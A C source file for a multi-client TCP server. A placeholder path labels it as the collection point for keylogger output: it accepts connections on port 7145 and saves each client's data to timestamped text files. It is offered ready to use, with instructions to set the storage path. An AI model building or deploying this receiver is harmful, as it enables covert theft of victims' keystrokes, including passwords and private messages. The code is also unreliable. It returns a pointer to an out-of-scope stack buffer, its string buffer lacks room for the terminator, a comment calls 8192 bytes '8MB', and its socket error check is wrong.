#include <stdio.h>	
#include <string.h>	// strlen
#include <stdlib.h>	// malloc
#include <sys/socket.h> // sockets	
#include <sys/stat.h>
#include <sys/types.h> // size_t etc.
#include <sys/time.h> 
#include <arpa/inet.h>	// inet_addr, inet_ntoa, ntohs etc
#include <netinet/in.h>
#include <ctype.h> // isprint, isdigit, isalpha
#include <unistd.h> // getpid
#include <time.h> 
#include <errno.h> // error codes
#include <fcntl.h>
#include<pthread.h> // pthread

// Errors Section Start
const char* Error_Socket_Accept_Failed = "Accept failed\n";
const char* Error_Socket_Creation_Failed = "Socket creation throwed error more than 10 times\n";
const char* Error_Socket_Option_Set_Failed = "Failed setting up options for socket\n";
const char* Error_Socket_Port_Bind_Failed = "Bind failed to port";
const char* Error_Socket_Listen_Failed = "Listen failed\n";
const char* Error_File_Open_Failed = "Failed to open file\n";
const char* Error_File_Read_Into_Buffer_Failed = "Failed to read file into buffer\n";
const char* Error_File_Write_Into_FD_Failed = "Failed to write buffer into file desciptor\n";
//Errors Section End

// Define Section Start
#define MAX_FILE_BUFFERSIZE 8192 // 8MB 
#define MAX_MESSAGE_BUFFERSIZE 128
#define BINDED_SUCCESS break
#define DROP_CONNECTION break
#define ERROR_ENCOUNTERED break
#define INVALID_SOCKET -1
#define INVALID_FILE -1
#define SERVER_IS_UP 1
#define CONNECTION_IS_UP 1
#define MASTER_SOCKET_IS_UP 1
#define ANYPORT 0
#define TRUE 0
#define FALSE -1
// Define Section End

// Prototype Section Start
char* GetFileNameWithPathBasedOnCurrentTime();
char* ConcatTwoStrings(const char *s1, const char *s2, char* buffer);
char* GetCurrentTime();
int BindSocket(int sockfd);
int AcceptConnection(int socket);
int Prepare_Master_Socket(int* master_socket, struct sockaddr_in* address);
void DisplayTime();
void ReceiveClientFile(int accepted_socket);
void PrintCustomErrorMessage(int error_code, char* text, char* optionalArgs);
void WriteToLog(int error_code, const char* message);
void HandleError(int error_code, const char* message);
void Reset_Client_Sockets(int client_sockets[], int max_connection_count);
// Prototype Secton End

// Program entry point
int main()
{
    DisplayTime();
    printf("Server Is Up\n\n");

    fd_set readfds; // socket descriptors
    int max_connection_count = 50;
    int client_sockets[max_connection_count]; // array of clients
    int socket_desc;
    int master_socket;

    struct sockaddr_in address; 
    struct sockaddr_in* address_pointer = &address;
    address.sin_family = AF_INET;   
    address.sin_addr.s_addr = INADDR_ANY;   
    address.sin_port = htons(7145); 
    int addrlen = sizeof(address);

    
    while (SERVER_IS_UP)
    {        
        if (Prepare_Master_Socket(&master_socket, &address) == TRUE)
        {
            //clear the socket set  
            Reset_Client_Sockets(client_sockets, max_connection_count);
            FD_ZERO(&readfds); 

            while(MASTER_SOCKET_IS_UP)
            {
                //add master socket to set 
                FD_SET(master_socket, &readfds);   
                int max_socket_desc = master_socket;   
                    
                //add child sockets to set  
                for (int i = 0; i < max_connection_count; i++)   
                {   
                    //socket descriptor  
                    socket_desc = client_sockets[i];   
                        
                    //if valid socket descriptor then add to read list  
                    if(socket_desc > 0)   
                    {
                        FD_SET(socket_desc, &readfds);   
                    }
                        
                    //highest file descriptor number, need it for the select function  
                    if(socket_desc > max_socket_desc)   
                    {
                        max_socket_desc = socket_desc;   
                    }
                }   

                //wait for an activity on one of the sockets, timeout is NULL, so wait indefinitely  
                printf("Awaiting activity...\n");
                int activity = select(max_socket_desc + 1, &readfds, 0, 0, 0);   
                if ((activity < 0) && (errno != EINTR))   
                {   
                    printf("select error\n");   
                }   
                
                //If something happened on the master socket, then it's an incoming connection    
                if (FD_ISSET(master_socket, &readfds))   
                {   
                    int new_socket;
                    if ((new_socket = accept(master_socket, (struct sockaddr *)&address, (socklen_t*)&addrlen)) < 0)   
                    {   
                        HandleError(errno, Error_Socket_Accept_Failed);
                        close(new_socket);
                        ERROR_ENCOUNTERED;
                    }   
                    
                    printf("New connection , socket fd is %d , ip is : %s , port : %d  \n", 
                            new_socket, inet_ntoa(address.sin_addr), ntohs(address.sin_port));   
                                    
                    //add new socket to array of sockets  
                    for (int i = 0; i < max_connection_count; i++)   
                    {   
                        //if position is empty  
                        if (client_sockets[i] == 0)   
                        {   
                            client_sockets[i] = new_socket;   
                            printf("Adding to list of sockets as %d\n" , i);   
                            break;   
                        }   
                    }   
                }   
                    
                // receive files from everyone who are waiting
                int valread;
                for (int i = 0; i < max_connection_count; i++)   
                {   
                    socket_desc = client_sockets[i];   
                    if (FD_ISSET(socket_desc, &readfds))   
                    {   
                        ReceiveClientFile(socket_desc);
                        printf("Received file, ip %s , port %d \n", inet_ntoa(address.sin_addr), ntohs(address.sin_port));   
                        client_sockets[i] = 0;   
                    }   
                }   
            }

            printf("Restarting server...\n");
        }

        close(master_socket);
    }
}

// Preparing master socket, head
int Prepare_Master_Socket(int* master_socket, struct sockaddr_in* address)
{
    if ((*master_socket = socket(AF_INET, SOCK_STREAM, 0)) == 0)   
    {   
        HandleError(errno, Error_Socket_Creation_Failed);
        return FALSE;
    }     

    int opt = 1;
    if (setsockopt(*master_socket, SOL_SOCKET, SO_REUSEADDR, (int*)&opt, sizeof(int)) < 0)
    {
        HandleError(errno, Error_Socket_Option_Set_Failed);
        return FALSE; 
    }

    if (bind(*master_socket, (struct sockaddr*)address, sizeof(*address)) < 0)   
    {   
        HandleError(errno, Error_Socket_Port_Bind_Failed);
        return FALSE;
    }   

    if (listen(*master_socket, 5) < 0)   
    {   
        HandleError(errno, Error_Socket_Listen_Failed);
        return FALSE;
    }  

    return TRUE;
}

// Sets all sockets to 0
void Reset_Client_Sockets(int client_sockets[], int max_connection_count)
{
    for (int i = 0; i < max_connection_count; i++)
    {
        client_sockets[i] = 0;
    }
}

// Gets current local time 
char* GetCurrentTime()
{
    time_t now;
    time(&now);
    return ctime(&now);
}

// Displays time in console
void DisplayTime()
{
    printf("Started at %s\n", GetCurrentTime());
}

// Receives clients file 
void ReceiveClientFile(int accepted_socket)
{
    int filefd = open(GetFileNameWithPathBasedOnCurrentTime(), O_WRONLY | O_CREAT | O_TRUNC, S_IRUSR | S_IWUSR);
    if (filefd == INVALID_FILE)
    {
        HandleError(errno, Error_File_Open_Failed);
        return;
    }

    char file_buffer[MAX_FILE_BUFFERSIZE];
    ssize_t read_return;
    int file_size = 0;
    int error_encountered = 0;
    int cycle_count = 1;
    do 
    {
        printf("Receiving file...\n");
        read_return = read(accepted_socket, file_buffer, MAX_FILE_BUFFERSIZE);
        if (cycle_count == 1)
        {
            file_size = (int)read_return;
        }

        if (read_return == INVALID_FILE)
        {
            error_encountered = 1;
            HandleError(errno, Error_File_Read_Into_Buffer_Failed);
            ERROR_ENCOUNTERED;
        }

        if (write(filefd, file_buffer, read_return) == INVALID_FILE)
        {
            error_encountered = 1;
            HandleError(errno, Error_File_Write_Into_FD_Failed);
            ERROR_ENCOUNTERED;
        }
        
        cycle_count++;
    }
    while(read_return > 0);
    
    if (error_encountered)
    {
        printf("Errors during file receive\n");
    }
    else
    {
        printf("File received (%d bytes)\n", file_size);
    }
    
    close(filefd);
}

// Concats any 2 strings to one and returns pointer to it (don't use with client input/large dynamic data)
char* ConcatTwoStrings(const char* string1, const char* string2, char* buffer)
{
    strcpy(buffer, string1);
    strcat(buffer, string2);

    return buffer;
}

// File name generator, which prevents any conflicts (example: tuesday 22 2020 13.00.txt)
char* GetFileNameWithPathBasedOnCurrentTime()
{
    char* path = "YOUR PATH WHERE KEYLOGGER FILES WILL BE"; //  SET YOUR DESIRED FILE PATH 
    char* name = GetCurrentTime();
    int length = strlen(name);
    for (int i = 0; i < length; i++)
    {
        char* p = &name[i];
        if (*p == '\n')
        {
            name[i] = '\0';
            break;
        }
    }

    char* file_extension = ".txt";
    char stringBuffer[strlen(path) + strlen(name) + strlen(file_extension)];
    char* file_path = ConcatTwoStrings(path, name, stringBuffer);
    return ConcatTwoStrings(file_path, file_extension, stringBuffer);
}

// In case if error occurs, writes error message with time when it occured in log
void WriteToLog(int error_code, const char* message)
{
    int filefd = open("YOUR PATH WHERE LOG WILL BE", O_WRONLY | O_CREAT | O_TRUNC, S_IRUSR | S_IWUSR); //  SET YOUR DESIRED FILE PATH 
    if (filefd == INVALID_FILE)
    {
        perror("Failed to open/create file\n");
        return;
    }

    char message_to_write[MAX_MESSAGE_BUFFERSIZE];
    sprintf(message_to_write, "%s: %s, %s\n", GetCurrentTime(), strerror(error_code), message);
    if (write(filefd, message_to_write, strlen(message_to_write)) == INVALID_FILE)
    {
        perror(Error_File_Write_Into_FD_Failed);
        return;
    }

    close(filefd);
}

// Small method for error handling, consists of two methods, that are being used often
void HandleError(int error_code, const char* message)
{
    perror(message);
    WriteToLog(error_code, message);
}
